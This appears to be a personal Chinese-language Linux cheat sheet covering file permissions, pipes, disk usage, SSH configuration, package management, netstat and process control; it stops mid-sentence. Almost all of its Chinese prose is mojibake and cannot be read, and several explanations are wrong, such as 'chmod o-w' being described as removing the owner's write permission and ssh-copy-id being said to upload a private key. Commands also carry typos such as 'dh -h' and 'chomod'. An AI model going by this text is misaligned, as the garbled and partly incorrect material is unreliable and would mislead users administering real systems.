æ–‡ä»¶æƒé™çš„é—®é¢˜lså‘½ä»¤æ‰§è¡Œæ˜¾ç¤ºçš„æ–‡ä»¶å‰ä¸€èˆ¬å¸¦æœ‰ä¸€ä¸²ä¿¡æ¯ç¬¬ä¸€ä½ï¼š ä»£è¡¨æ–‡ä»¶lä»£è¡¨é“¾æ¥dä»£è¡¨ç›®å½• åé¢ä¹ä½åˆ’åˆ†ä¸ºä¸‰å—ï¼Œå¯èƒ½çš„æƒé™æœ‰è¿™ä¹ˆå‡ ç§r(readæƒé™)w(å†™æƒé™)-(æ— æƒé™)x(æ‰§è¡Œæƒé™) ç¬¬ä¸€ç»„ä»£è¡¨æ‰€æœ‰è€…(u)æƒé™ï¼Œç¬¬äºŒç»„ä»£è¡¨ä¸æ‰€æœ‰è€…ä¸€ä¸ªç”¨æˆ·ç»„çš„ç”¨æˆ·(g)çš„æƒé™ï¼Œç¬¬ä¸‰ç»„ä»£è¡¨å…¶ä»–ç”¨æˆ·(O)çš„æƒé™user,user groupè¿˜æœ‰other æ›´æ”¹æ–‡ä»¶æƒé™å‘½ä»¤: chmod(ä¸ªäººæµ‹ä¸‹æ¥è¦åŠ sudoæ‰è¡Œ) sudo chmod +x filename //åŠ ä¸Šå¯æ‰§è¡Œæƒé™ï¼Œæ‰€æœ‰ç”¨æˆ·éƒ½åŠ ä¸Šäº† sudo chmod u+x filename //ç»™å½“å‰ç”¨æˆ·åŠ ä¸Šå¯æ‰§è¡Œæƒé™ uï¼šç”¨æˆ· gï¼šç»„ oï¼šå…¶å®ƒç”¨æˆ· aï¼šæ‰€æœ‰ç”¨æˆ· ```bash $chmod a+x main å¯¹æ‰€æœ‰ç”¨æˆ·ç»™æ–‡ä»¶mainå¢åŠ å¯æ‰§è¡Œæƒé™ $chmod g+w blogs å¯¹ç»„ç”¨æˆ·ç»™æ–‡ä»¶blogså¢åŠ å¯å†™æƒé™ //å…¶ä»–å‘½ä»¤ä¸ä¸€ä¸€åˆ—ä¸¾ u ï¼šç›®å½•æˆ–è€…æ–‡ä»¶çš„å½“å‰çš„ç”¨æˆ· g ï¼šç›®å½•æˆ–è€…æ–‡ä»¶çš„å½“å‰çš„ç¾¤ç»„ o ï¼šé™¤äº†ç›®å½•æˆ–è€…æ–‡ä»¶çš„å½“å‰ç”¨æˆ·æˆ–ç¾¤ç»„ä¹‹å¤–çš„ç”¨æˆ·æˆ–è€…ç¾¤ç»„ a ï¼šæ‰€æœ‰çš„ç”¨æˆ·åŠç¾¤ç»„ r ï¼šè¯»æƒé™ï¼Œç”¨æ•°å­—4è¡¨ç¤º w ï¼šå†™æƒé™ï¼Œç”¨æ•°å­—2è¡¨ç¤º x ï¼šæ‰§è¡Œæƒé™ï¼Œç”¨æ•°å­—1è¡¨ç¤º ï¼šåˆ é™¤æƒé™ï¼Œç”¨æ•°å­—0è¡¨ç¤º æ‰€ä»¥ç»™æ‰€æœ‰ç”¨æˆ·å¢åŠ a.txtæ–‡ä»¶çš„å¯æ‰§è¡Œæƒé™å°±åƒè¿™æ ·chmod a+x a.txt #å…¶ä½™è‡ªè¡Œå‘æŒ¥chmod a-x a.txt #åˆ é™¤æ‰€æœ‰ç”¨æˆ·çš„å¯æ‰§è¡Œæƒé™chmod o-w ##ä»owneræ‰‹ä¸­æ”¶å›writeæƒé™ chmod 755 filename751åº”è¯¥æ˜¯è¯»/å†™/æ‰§è¡Œchomod 444 filename# ä¸ºæ‰€æœ‰ç”¨æˆ·åˆ†é…è¯»æƒé™chmod 777 filename //å…¨éƒ¨æƒé™éƒ½æœ‰äº†ï¼Œå…¶å®ä¸Šé¢çš„9ä½å°±æ˜¯è¿™ä¸‰ä½æ•°æ¯ä¸€ä½çš„äºŒè¿›åˆ¶æ‹¼èµ·æ¥çš„755 å°±æ˜¯ 111101101,ä¹Ÿå°±å¯¹åº”ä¸Šé¢çš„æƒé™ä¹ä½å­—æ¯ chown -R Jane /foldername # æŠŠflodernameæ–‡ä»¶å¤¹çš„æ‰€æœ‰è€…æ”¹ä¸ºJaneï¼Œ -R è¡¨ç¤ºé€’å½’ï¼Œä¼šä¿è¯æ‰€æœ‰å­æ–‡ä»¶å¤¹çš„æ‰€æœ‰è€…ä¹Ÿè¢«æ›´æ”¹ æ›´æ”¹æ–‡ä»¶æ‰€æœ‰è€… &gt; chown username filename ### 6. ç®¡é“ å°†ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä¼ é€ç»™å¦ä¸€ä¸ªå‘½ä»¤ï¼Œä½œä¸ºå¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ eg: ä¸­é—´é‚£æ¡ç«–çº¿å«åšç®¡é“è¿æ¥ç¬¦ ```bash $ cat /etc/passwd | grep usernametofind $ ls -l | grep &quot;^d&quot; $ ls -l * | grep &quot;^-&quot; | wc -| //&quot;^-&quot;è¡¨ç¤ºä¸åˆ—å‡ºç›®å½•æˆ–é“¾æ¥ï¼Œåªå±•ç¤ºç›®å½•ï¼›wcæ˜¯æ•°è¡Œæ•° $ ls -l | grep &quot;^d&quot; //åªåˆ—å‡ºç›®å½• æˆ‘æƒ³çŸ¥é“javaè¿™ä¸ªç¨‹åºåœ¨å“ªé‡Œï¼ŒåŒæ—¶æŠŠç»“æœå¼„åˆ°å‰ªåˆ‡æ¿ä¸Šåœ¨macä¸Šå¯ä»¥è¿™ä¹ˆå¹²,ä½¿ç”¨pbcopyå‘½ä»¤ cat ~/.bashrc | pbcopy ## å‰ªåˆ‡æ¿å†…å®¹ï¼š /usr/bin/java é‚£ä¹ˆåœ¨linuxä¸Šå‘¢ï¼Ÿ which java | ??? ç„¶è€Œlinuxå¹¶æœªè‡ªå¸¦è¿™ä¸ªåŠŸèƒ½ã€‚pipe output to clipboardwin sudo apt-get install xclip cat file | xclip ## å¤åˆ¶ xclip -o ## ç²˜è´´ 7. ç¡¬ä»¶ç›¸å…³çš„å‘½ä»¤æŸ¥çœ‹ç¡¬ç›˜å­˜å‚¨ç©ºé—´: df -h //hçš„æ„æ€æ˜¯human-readable du -sh //æŸ¥çœ‹å½“å‰directoryçš„å¤§å° du -sh * //du --summary --human-readable * æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•çš„æ€»å¤§å° du -h //æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹å„ä¸ªå­ç›®å½•åˆ†åˆ«çš„å¤§å° dh -h img// æŸ¥çœ‹imgç›®å½•ä¸‹æ–‡ä»¶åŠæ–‡ä»¶å¤¹çš„å¤§å° dh -h img/1.jpg //æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶çš„å¤§å° du -hsBM //æŸ¥çœ‹å½“å‰ç›®å½•çš„å¤§å°(sè¡¨ç¤ºsummary)ï¼Œä»¥MBä¸ºå•ä½ du -hsBM /var/* | sort -n //æŸ¥çœ‹/varç›®å½•ä¸‹å…¨éƒ¨æ–‡ä»¶ï¼Œä»å°åˆ°å¤§æ’åˆ— æŸ¥çœ‹cpuä¿¡æ¯ &gt; cat /proc/cpuinfo æŸ¥çœ‹å†…å­˜ &gt; cat /proc/meminfo | grep Mem &gt;free -m free -h # human readable ä¿®æ”¹é»˜è®¤å®‰å…¨è®¾ç½® &gt; vi /etc/ssh/ssd_config æ·»åŠ æˆ–ä¿®æ”¹ Port 22 (sshé»˜è®¤ç«¯å£ä¿®æ”¹) PermitRootLogin without-Password no AllowUsers userName æŠŠç™»å½•ç«¯å£æ”¹å¤§ä¸€ç‚¹è¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼Œäº²æµ‹ä¸éš¾ vi /etc/ssh/sshd_config service ssh restart æå®š çœ‹ä¸‹æˆåŠŸç™»å½•å†å² - last | less | sort -rn ### who å‘½ä»¤æ›´å¥½ï¼Œæ˜¯æŒ‡wtmpæ–‡ä»¶åˆ›å»ºä»¥æ¥çš„ç™»å½•è®°å½• who /var/log/wtmp å‹ç¼©æ–‡ä»¶å‘½ä»¤å°†/home/video/ è¿™ä¸ªç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ‰“åŒ…ä¸ºå½“å‰ç›®å½•ä¸‹çš„video.zip zip â€“q â€“r -v video.zip . #åŠ ä¸Šä¸€ä¸ª-vä¸»è¦æ˜¯ä¸ºäº†èƒ½å¤Ÿå®æ—¶æŸ¥çœ‹è¾“å‡º é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œtaræ‰“å‡ºæ¥çš„.taråŒ…åœ¨windowsä¸‹æ˜¯ä¸è®¤çš„ï¼Œéœ€è¦è£…7-zipä¹‹ç±»çš„è½¯ä»¶ã€‚zipæ‰“å‡ºæ¥çš„åŒ…windowsä¸‹æ˜¯è®¤çš„ã€‚ æ–‡ä»¶ä¼ è¾“ï¼ˆlinux -&gt;windowsï¼‰ï¼š ä¸€èˆ¬ä½¿ç”¨putty sshåˆ°Linuxä¸»æœºï¼Œæƒ³è¦æŠŠLinuxä¸Šçš„æ–‡ä»¶å¼„åˆ°Windowsä¸­ï¼Œéœ€è¦ä½¿ç”¨pscpå·¥å…·ã€‚ä¸‹è½½å¥½pscp.exeåï¼Œæ”¾åˆ°c:/windows/system32ä¸‹é¢ã€‚æ‰“å¼€cmdã€‚è¾“å…¥å‘½ä»¤ pscp -r root@202.123.123.123:&quot;/root/fileonServer.mp4&quot; d:/whateveriwantonmyPc.mp4 ï¼Œç¡®è®¤åè¾“å…¥rootå¯†ç å°±å¥½äº†ã€‚æˆ‘ä¸»è¦æ˜¯ç”¨æ¥ä¸‹è½½è§†é¢‘çš„ã€‚æœ‰æ—¶å€™ä¼šå‡ºç°Connection Refused Errorã€‚ &gt; netstat -anp | grep sshd çœ‹ä¸‹è·‘åœ¨å“ªä¸ªç«¯å£ç„¶å pscp -P 12345-r root@202.123.123.123:â€/root/fileonServer.mp4â€ d:/whateveriwantonmyPc.mp4 ## -pè¦å¤§å†™ 8. è½¯ä»¶çš„å®‰è£…ï¼Œå¸è½½(dpkgå‘½ä»¤ï¼Œä¸è¦åªä¼šapt-get) åœ¨debianä¸‹ï¼Œä½ å¯ä»¥ä½¿ç”¨dpkg(Debian package system)æ¥å®‰è£…å’Œå¸è½½è½¯ä»¶åŒ…ã€‚ è¿˜æ˜¯é‚£å¥è¯ï¼Œæ²¡äº‹ä¸è¦æ‰‹è´±å‡çº§è½¯ä»¶ ### ï¼ˆ1ï¼‰ç§»é™¤å¼å¸è½½ï¼š apt-get remove softname1 softname2 â€¦; ï¼ˆç§»é™¤è½¯ä»¶åŒ…ï¼Œå½“åŒ…å°¾éƒ¨æœ‰+æ—¶ï¼Œæ„ä¸ºå®‰è£…ï¼‰ ### ï¼ˆ2ï¼‰æ¸…é™¤å¼å¸è½½ ï¼š apt-get --purge remove softname1 softname2...;(åŒæ—¶æ¸…é™¤é…ç½®ï¼Œåˆ å¹²å‡€) ### æ¸…é™¤å¼å¸è½½ï¼š apt-get purge softname1 softname2...;(åŒä¸Šï¼Œä¹Ÿæ¸…é™¤é…ç½®æ–‡ä»¶) ### ï¼ˆ1ï¼‰ç§»é™¤å¼å¸è½½ï¼š dpkg -r pkg1 pkg2 ...; ###ï¼ˆ2ï¼‰æ¸…é™¤å¼å¸è½½ï¼š dpkg -P pkg1 pkg2...; ### ä½¿ç”¨dpkgå®‰è£…debåŒ… dpkg -i tcl8.4_8.4.19-2_amd64.deb ###ä½¿ç”¨kpkg -ræ¥åˆ é™¤debåŒ… dpkg -r tcl8.4 å‚è€ƒUbuntu ä¸­è½¯ä»¶çš„å®‰è£…ã€å¸è½½ä»¥åŠæŸ¥çœ‹çš„æ–¹æ³•æ€»ç»“ å…³äºapt-get apt-cache search # ------(package æœç´¢åŒ…)å°±æ˜¯çœ‹ä¸‹ç¬¦åˆè¿™ä¸ªåç§°çš„åœ¨repositoryä¸­åŒ…æœ‰å“ªäº› apt-cache show #------(package è·å–åŒ…çš„ç›¸å…³ä¿¡æ¯ï¼Œå¦‚è¯´æ˜ã€å¤§å°ã€ç‰ˆæœ¬ç­‰) apt-get install # ------(package å®‰è£…åŒ…) apt-get install # -----(package --reinstall é‡æ–°å®‰è£…åŒ…) apt-get -f install # -----(å¼ºåˆ¶å®‰è£…, &quot;-f = --fix-missing&quot;å½“æ˜¯ä¿®å¤å®‰è£…å§...) apt-get remove #-----(package åˆ é™¤åŒ…) apt-get remove --purge # ------(package åˆ é™¤åŒ…ï¼ŒåŒ…æ‹¬åˆ é™¤é…ç½®æ–‡ä»¶ç­‰) apt-get autoremove --purge # ----(package åˆ é™¤åŒ…åŠå…¶ä¾èµ–çš„è½¯ä»¶åŒ…+é…ç½®æ–‡ä»¶ç­‰ï¼ˆåªå¯¹6.10æœ‰æ•ˆï¼Œå¼ºçƒˆæ¨èï¼‰) apt-get update #------æ›´æ–°æº apt-get upgrade #------æ›´æ–°å·²å®‰è£…çš„åŒ…ï¼Œä¸ä¼šç§»é™¤ä»»ä½•åŒ… apt-get dist-upgrade # --------- æ›´æ–°åŒ…ï¼Œä½†å¦‚æœæœ‰äº›å·²å®‰è£…çš„åŒ…è¢«è¢«æ ‡è®°ä¸ºéœ€è¦ç§»é™¤çš„è¯ï¼Œä¼šç§»é™¤åŒ… apt-get dselect-upgrade #------ä½¿ç”¨ dselect å‡çº§ apt-cache depends #-------(package äº†è§£ä½¿ç”¨ä¾èµ–) apt-cache rdepends # ------(package äº†è§£æŸä¸ªå…·ä½“çš„ä¾èµ–,å½“æ˜¯æŸ¥çœ‹è¯¥åŒ…è¢«å“ªäº›åŒ…ä¾èµ–å§...) apt-get build-dep # ------(package å®‰è£…ç›¸å…³çš„ç¼–è¯‘ç¯å¢ƒ) apt-get source #------(package ä¸‹è½½è¯¥åŒ…çš„æºä»£ç ) apt-get clean &amp;&amp; apt-get autoclean # --------æ¸…ç†ä¸‹è½½æ–‡ä»¶çš„å­˜æ¡£ &amp;&amp; åªæ¸…ç†è¿‡æ—¶çš„åŒ… apt-get check #-------æ£€æŸ¥æ˜¯å¦æœ‰æŸåçš„ä¾èµ– dpkg -S filename -----æŸ¥æ‰¾filenameå±äºå“ªä¸ªè½¯ä»¶åŒ… apt-file search filename -----æŸ¥æ‰¾filenameå±äºå“ªä¸ªè½¯ä»¶åŒ… apt-file list packagename -----åˆ—å‡ºè½¯ä»¶åŒ…çš„å†…å®¹ apt-file update --æ›´æ–°apt-fileçš„æ•°æ®åº“ dpkg --info &quot;è½¯ä»¶åŒ…å&quot; --åˆ—å‡ºè½¯ä»¶åŒ…è§£åŒ…åçš„åŒ…åç§°. dpkg -l --åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰çš„åŒ….å¯ä»¥å’Œå‚æ•°lessä¸€èµ·ä½¿ç”¨åœ¨åˆ†å±æŸ¥çœ‹. (ç±»ä¼¼äºrpm -qa) dpkg -l |grep -i &quot;è½¯ä»¶åŒ…å&quot; --æŸ¥çœ‹ç³»ç»Ÿä¸­ä¸&quot;è½¯ä»¶åŒ…å&quot;ç›¸å…³è”çš„åŒ…. dpkg -s æŸ¥è¯¢å·²å®‰è£…çš„åŒ…çš„è¯¦ç»†ä¿¡æ¯. dpkg -L æŸ¥è¯¢ç³»ç»Ÿä¸­å·²å®‰è£…çš„è½¯ä»¶åŒ…æ‰€å®‰è£…çš„ä½ç½®. (ç±»ä¼¼äºrpm -ql) dpkg -S æŸ¥è¯¢ç³»ç»Ÿä¸­æŸä¸ªæ–‡ä»¶å±äºå“ªä¸ªè½¯ä»¶åŒ…. (ç±»ä¼¼äºrpm -qf) dpkg -I æŸ¥è¯¢debåŒ…çš„è¯¦ç»†ä¿¡æ¯,åœ¨ä¸€ä¸ªè½¯ä»¶åŒ…ä¸‹è½½åˆ°æœ¬åœ°ä¹‹åçœ‹çœ‹ç”¨ä¸ç”¨å®‰è£…(çœ‹ä¸€ä¸‹å‘—). dpkg -i æ‰‹åŠ¨å®‰è£…è½¯ä»¶åŒ…(è¿™ä¸ªå‘½ä»¤å¹¶ä¸èƒ½è§£å†³è½¯ä»¶åŒ…ä¹‹å‰çš„ä¾èµ–æ€§é—®é¢˜),å¦‚æœåœ¨å®‰è£…æŸä¸€ä¸ªè½¯ä»¶åŒ…çš„æ—¶å€™é‡åˆ°äº†è½¯ä»¶ä¾èµ–çš„é—®é¢˜,å¯ä»¥ç”¨apt-get -f installåœ¨è§£å†³ä¿¡èµ–æ€§è¿™ä¸ªé—®é¢˜. dpkg -r å¸è½½è½¯ä»¶åŒ….ä¸æ˜¯å®Œå…¨çš„å¸è½½,å®ƒçš„é…ç½®æ–‡ä»¶è¿˜å­˜åœ¨. dpkg -P å…¨éƒ¨å¸è½½(ä½†æ˜¯è¿˜æ˜¯ä¸èƒ½è§£å†³è½¯ä»¶åŒ…çš„ä¾èµ–æ€§çš„é—®é¢˜) dpkg -reconfigure é‡æ–°é…ç½® apt list --upgradable ## çœ‹ä¸€ä¸‹å“ªäº›ç¨‹åºå¯ä»¥æ›´æ–° install snap package(é€šå¸¸é€šè¿‡apt-get installè½¯ä»¶æ—¶å€™ä¼šé¡ºå¸¦å°†è¯¥è½¯ä»¶æ‰€éœ€è¦çš„ä¾èµ–ä¹Ÿå®‰è£…ä¸‹æ¥ï¼Œä¸‹æ¬¡è£…ä¸€ä¸ªå…¶ä»–è½¯ä»¶çš„æ—¶å€™å¦‚æœæœ‰ç±»ä¼¼çš„ä¾èµ–ï¼Œå°±ç›´æ¥ç”¨äº†ã€‚è€Œsnap packageæœ¬èº«å°±bundleäº†æ‰€éœ€çš„ä¾èµ–)ã€‚è¿™ä¸ªæ¦‚å¿µè¿˜æ¯”è¾ƒæ–°ï¼Œä»…é™äºubuntu,debianä¹Ÿæ²¡æœ‰ã€‚ 9. ç½‘ç»œç›‘æ§tcpdumpç»“åˆwiresharkå¯å®ç°å®Œæ•´çš„ç½‘ç»œæŠ“åŒ…ï¼Œè¿™ä¸ªæ”¾åœ¨ä¸‹é¢å†™ã€‚ netstatè¢«åºŸå¼ƒäº†ï¼Œç”¨sså°±å¯ä»¥äº† netstat netstat -i ## æŸ¥çœ‹æŸä¸ªç½‘ç»œæ¥å£å‘å‡ºå’Œæ¥æ”¶äº†å¤šå°‘byteçš„æ•°æ® netstat -ta ##å½“å‰activeçš„ç½‘ç»œè¿æ¥ t: tcp a: all u: udp p:process netstat -tan ##ä»¥ipåœ°å€çš„æ–¹å¼å±•ç¤ºå‡ºæ¥ n: ç¦æ­¢åŸŸåè§£æï¼Œå°±æ˜¯ä¸æ˜¾ç¤ºåŸŸåï¼Œç›´æ¥æ˜¾ç¤ºip netstat -tupln ##tcp+udp+program name+ç›‘å¬çš„ç«¯å£+numerically netstat -ie ##æ¯”è¾ƒå‹å¥½çš„æ–¹å¼å±•ç¤ºå½“å‰å„ä¸ªç«¯å£çš„æµé‡ï¼Œå°±æ˜¯æ˜¾ç¤ºæ¯ä¸ªç½‘å¡å‘é€çš„æµé‡ï¼Œæ¥æ”¶çš„æµé‡ä¸€å…±å¤šå°‘MB,è¿™ç§ netstat -nlpt ##è·å–è¿›ç¨‹åã€è¿›ç¨‹å·ä»¥åŠç”¨æˆ· ID netstat -s ##å¯ä»¥æ‰“å°å‡ºç½‘ç»œç»Ÿè®¡æ•°æ®ï¼ŒåŒ…æ‹¬æŸä¸ªåè®®ä¸‹çš„æ”¶å‘åŒ…æ•°é‡ã€‚ netstat -ct ## c:æŒç»­è¾“å‡º netstat -tn ## netstat -lnput ## check Active Internet connections (only servers) ## ä½¿ç”¨watchå‘½ä»¤ç›‘è§†activeçŠ¶æ€çš„è¿æ¥ï¼Œå®æ—¶æ˜¾ç¤ºç½‘ç»œæµé‡ watch -d -n0 &quot;netstat -atnp | grep ESTA&quot; ## åˆ—å‡ºå½“å‰æ‰€æœ‰è¿æ¥åˆ°æœ¬æœºçš„è¿œç¨‹ipåœ°å€å¹¶æ’åº netstat -tn 2&gt;/dev/null | grep :80 | awk &#39;{print $5}&#39; | cut -d: -f1 | sort | uniq -c | sort -nr | head ifconfig ## æŸ¥çœ‹æœºå™¨ä¸Šçš„ç½‘å¡,ä¸è¿‡ifconfigå·²ç»è¢«deprecatedå¾ˆä¹…äº†ï¼Œä»¥åè¦ä¹ æƒ¯ä½¿ç”¨ipå‘½ä»¤ en01 ##Ethernet ##æ³¨æ„ RX bytes(æ¥æ”¶åˆ°çš„æ•°æ®)å’ŒTX bytes(å‘é€å‡ºå»çš„æ•°æ®)åé¢çš„æ•°å­— curl ipinfo.io/ip ## æŸ¥çœ‹æœ¬æœºçš„å¤–ç½‘åœ°å€ ip address show //ç±»ä¼¼çš„å‘½ä»¤ï¼Œæ®è¯´å¤šæ•°distributionæ‰“ç®—ç”¨ipæ›¿ä»£ipconfig ip addr show //å’Œä¸Šé¢ä¸€æ · ip a //ä¹Ÿä¸€æ · cat /etc/network/interfaces systemctl status NetworkManager ## æŸ¥çœ‹ç»´æŠ¤ç³»ç»Ÿç½‘ç»œçš„daemon systemctl restart NetworkManager ## é‡å¯networkManager 10.æŸ¥çœ‹è¿›ç¨‹èµ·ä¸€ä¸ªè¿›ç¨‹ï¼Œåå°è¿è¡Œï¼Œå…³æ‰ç»ˆç«¯ç…§æ ·è·‘çš„é‚£ç§ nohup node server.js &gt; /dev/null 2&gt;&amp;1 &amp; nohup node server.js &gt; /dev/null 2&gt;&amp;1 &amp; 1. nohup means: Do not terminate this process even when the stty is cut off. 2. &gt; /dev/null means: stdout goes to /dev/null (which is a dummy device that does not record any output). 3. 2&gt;&amp;1 means: stderr also goes to the stdout (which is already redirected to /dev/null). You may replace &amp;1 with a file path to keep a log of errors, e.g.: 2&gt;/tmp/myLog 4. &amp; at the end means: run this command as a background task. å…¶å®ç”¨supervisorä¹Ÿå¯ä»¥nohupçš„è§£é‡Š top åŠ¨æ€æ˜¾ç¤º PIDï¼šè¿›ç¨‹çš„ID[å‚æ•°è§£é‡Š](http://www.cnblogs.com/gaojun/p/3406096.html) USERï¼šè¿›ç¨‹æ‰€æœ‰è€… PRï¼šè¿›ç¨‹çš„ä¼˜å…ˆçº§åˆ«ï¼Œè¶Šå°è¶Šä¼˜å…ˆè¢«æ‰§è¡Œ NIniceï¼šå€¼ VIRTï¼šè¿›ç¨‹å ç”¨çš„è™šæ‹Ÿå†…å­˜ RESï¼šè¿›ç¨‹å ç”¨çš„ç‰©ç†å†…å­˜ SHRï¼šè¿›ç¨‹ä½¿ç”¨çš„å…±äº«å†…å­˜ Sï¼šè¿›ç¨‹çš„çŠ¶æ€ã€‚Sè¡¨ç¤ºä¼‘çœ ï¼ŒRè¡¨ç¤ºæ­£åœ¨è¿è¡Œï¼ŒZè¡¨ç¤ºåƒµæ­»çŠ¶æ€ï¼ŒNè¡¨ç¤ºè¯¥è¿›ç¨‹ä¼˜å…ˆå€¼ä¸ºè´Ÿæ•° %CPUï¼šè¿›ç¨‹å ç”¨CPUçš„ä½¿ç”¨ç‡ %MEMï¼šè¿›ç¨‹ä½¿ç”¨çš„ç‰©ç†å†…å­˜å’Œæ€»å†…å­˜çš„ç™¾åˆ†æ¯” TIME+ï¼šè¯¥è¿›ç¨‹å¯åŠ¨åå ç”¨çš„æ€»çš„CPUæ—¶é—´ï¼Œå³å ç”¨CPUä½¿ç”¨æ—¶é—´çš„ç´¯åŠ å€¼ã€‚ COMMANDï¼šè¿›ç¨‹å¯åŠ¨å‘½ä»¤åç§° ps a æ˜¾ç¤ºç°è¡Œç»ˆç«¯æœºä¸‹çš„æ‰€æœ‰ç¨‹åºï¼ŒåŒ…æ‹¬å…¶ä»–ç”¨æˆ·çš„ç¨‹åºã€‚ **çœ‹ä¸‹æŸä¸ªè¿›ç¨‹è·‘åœ¨å“ªä¸ªç«¯å£** netstat -anp | grep sshd ps | grep ç±»ä¼¼äº pgrep XXX //æŸ¥æ‰¾æŸä¸ªè¿›ç¨‹ pgrep -lf ss //æ‰¾åˆ°sshd,nginxè¿™äº›è¿›ç¨‹ è¿›ç¨‹å‘½ä»¤ *å®æ—¶ç›‘æ§ï¼Œ1ç§’åˆ·æ–°ä¸€æ¬¡* watch -n 1 ps -aux --sort=-pmem,-pcpu #åˆ—å‡ºæ‰€æœ‰ç«¯å£çš„å ç”¨æƒ…å†µ netstat -anp lsof -i # è¿™ä¸ªä¹Ÿè¡Œ #æŸ¥çœ‹å“ªä¸ªè¿›ç¨‹å äº†httpç«¯å£(å…¶å®å°±æ˜¯80äº†) lsof -i:80 #æŸ¥çœ‹æŸä¸ªè¿›ç¨‹å äº†å“ªäº›ç«¯å£ netstat -anp|grep pid lsof //list opened files ##çœ‹ä¸‹mysqlç”¨äº†å“ªäº›æ–‡ä»¶ lsof -c mysql ## æŸ¥çœ‹ç«¯å£å ç”¨ sudo lsof -iTCP ##åªæ˜¾ç¤ºTCPç«¯å£ sudo lsof -iUDP ## åªæ˜¾ç¤ºUDPç«¯å£ sudo lsof -iTCP -sTCP:LISTEN ## æŸ¥çœ‹æ‰€æœ‰å¤„äºlistençŠ¶æ€çš„ sudo lsof -iTCP -sTCP:ESTABLISHED ## ESTABLISHEDçŠ¶æ€çš„ [æŸ¥çœ‹æŸä¸€è¿›ç¨‹ä½¿ç”¨çš„port](https://unix.stackexchange.com/questions/157823/list-ports-a-process-pid-is-listening-on-preferably-using-iproute2-tools) ss -l -p -n | grep &quot;pid=1234,&quot; ## æ€è¿›ç¨‹ï¼ˆå¦‚æœè¿›ç¨‹ä¸å±äºå½“å‰ç”¨æˆ·ï¼Œè¦sudoï¼‰ ## æ€è¿›ç¨‹ï¼Œæ…ç”¨ã€‚ kill -9 è¿›ç¨‹id // 9ç›´æ¥å¹²æ‰è¿›ç¨‹ï¼Œæ…ç”¨ã€‚ã€‚ã€‚ kill pid // è¿™ä¸ªå’Œkill 15æ˜¯ä¸€æ ·çš„ //15è¡¨ç¤ºterminate,è¯·æ±‚è¿›ç¨‹åœä¸‹æ¥ kill -l //å‘Šè¯‰ä½ killå¯ä»¥ä¼ å“ªäº›å‚æ•° åœ¨linuxä¸Šè¾“å‡ºæ˜¯è¿™æ ·çš„ï¼š &gt; HUP INT QUIT ILL TRAP ABRT BUS FPE KILL USR1 SEGV USR2 PIPE ALRM TERM 16 CHLD CONT STOP TSTP TTIN TTOU URG XCPU XFSZ VTALRM PROF WINCH POLL 30 SYS killall nginx -&gt;&gt; å¹²æ‰nginxçš„æ‰€æœ‰è¿›ç¨‹ pkill -u username //å¹²æ‰æ‰€æœ‰å±äºæŸä¸€ä¸ªç”¨æˆ·çš„ps Signal (ä¿¡å·) man signal è¿›ç¨‹çŠ¶æ€ runnableã€sleepingã€zombieã€stop //æ›´æ”¹å‹å–„åº¦,æ•°å­—è¶Šå°è¶Šä¸å‹å¥½ nice -n 15 /..... å‘½ä»¤pathã€‚å¯åŠ¨çš„æ—¶å€™ç¡®å®šnice renice -s pid //æ›´æ”¹å‹å–„åº¦ df -ah // æŸ¥çœ‹mountedæ–‡ä»¶ç³»ç»Ÿ proc 11 .å¸¸ç”¨é…ç½® æŸ¥çœ‹ç™»é™†å¤±è´¥æ—¥å¿— grep â€œFailed password for rootâ€ /var/log/auth.log | awk â€˜{print $11}â€™ | sort | uniq -c | sort -nr | more //å…¶å®å°±æ˜¯å»ä¸€ä¸ªæ–‡ä»¶é‡Œé¢æŸ¥çœ‹ç¬¬ä¸€åˆ—çš„å†…å®¹ï¼Œç„¶åuniqå¹¶ä¸”sortä¸€ä¸‹ é˜²èŒƒæªæ–½ä¿®æ”¹ç™»é™†ç«¯å£å· sudo vi /etc/ssh/sshd_config Port 4484 PermitRootLogin no ###æ”¹äº†sshd_configä¹‹ååƒä¸‡è®°å¾—é‡å¯sshæœåŠ¡ï¼Œä¸ç„¶ä¼šå‡ºç°connection refused. /etc/init.d/ssh restart ##CentOS é‡å¯SSH ï¼š service sshd restart ###DeBiané‡å¯SSHï¼š service ssh restart æŸ¥çœ‹ç³»ç»Ÿreleaseç‰ˆæœ¬ more /etc/*release ### è¿™ä¸ªä¹Ÿè¡Œ lsb_release -a ç›´æ¥é€šè¿‡sshæœåŠ¡ç™»å½• ssh username@you.ip.address -p 22 ## ä¼šæç¤ºè¾“å…¥å¯†ç çš„ macä¸Šä½¿ç”¨ssh å…å¯†ç ç™»å½•è¿œç¨‹serverçš„æ–¹å¼é¦–å…ˆåœ¨æœ¬åœ°ä½¿ç”¨keygenç”Ÿæˆä¸€ä¸ªid_rsa_pub_xxxæ–‡ä»¶ï¼Œå¤šä¸ªæœåŠ¡å™¨çš„å…¬é’¥åå­—è¿˜æ˜¯å–ä¸åŒçš„å¥½ã€‚è¾“å…¥passphraseçš„æ—¶å€™æœ€å¥½è¾“å…¥ç‚¹ä»€ä¹ˆï¼Œåé¢ä¼šç”¨ä¸Šã€‚ssh-copy-id ~/.ssh/id_rsa_xxx.pub yourusernameonvps@123.123.123.123 // æŠŠè¿™ä¸ªid_rsa_xxx.privatekeyä¸Šä¼ åˆ°è¿œç¨‹æœåŠ¡å™¨ ï¼Œä¼šè¦æ±‚è¾“å…¥å¯†ç çš„è¿™ä¸ªæ—¶å€™å¦‚æœæŸ¥çœ‹æœåŠ¡å™¨ä¸Šçš„~/.ssh/authorized_keys ã€‚è¿™æ‰å‘ç°åˆšæ‰çš„æ“ä½œå°±æ˜¯æŠŠå…¬é’¥å†…å®¹è¿½åŠ åˆ°è¿™ä¸ªæ–‡ä»¶åé¢äº†ã€‚æ³¨æ„è¿™ä¸ªæ–‡ä»¶çš„æƒé™åº”è¯¥æ˜¯400åœ¨æœ¬åœ°macçš„~/.ssh/config æ–‡ä»¶ä¸­æ·»åŠ è¿™ä¸ªHostã€‚Userï¼ŒHostName, Port, 